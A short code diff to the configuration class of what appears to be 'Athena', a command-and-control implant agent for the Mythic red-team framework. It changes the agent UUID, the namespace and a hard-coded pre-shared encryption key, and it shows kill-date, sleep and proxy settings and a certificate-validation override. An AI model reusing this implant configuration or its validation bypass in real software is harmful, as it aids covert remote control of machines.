@@ -7,7 +7,7 @@ using System.Net.Http.Headers;
 using System.Net.Security;
 using System.Threading.Tasks;
 
-namespace Athena.Config
+namespace Athena
 {
     public class MythicConfig
     {
@@ -21,7 +21,7 @@ namespace Athena.Config
         public MythicConfig()
         {
 
-            uuid = "49a95eb0-6044-421e-ab1d-552ffd2f66e5";
+            uuid = "dd2c16a8-6a6d-4ed8-b9b7-220f9da81150";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             int sleep = int.TryParse("5", out sleep) ? sleep : 60;
@@ -63,7 +63,7 @@ namespace Athena.Config
             this.proxyHost = ":";
             this.proxyPass = "";
             this.proxyUser = "";
-            this.psk = "QNfBXkhh2O0hfDrmh3kYhtZVkLfCb8ttFl0aCl+vILQ=";
+            this.psk = "RDJBPJ4tsQC8R/WMo2ub4HPUmvA2HCLLzSG7HJkEG5o=";
 
             //Might need to make this configurable
             ServicePointManager.ServerCertificateValidationCallback =
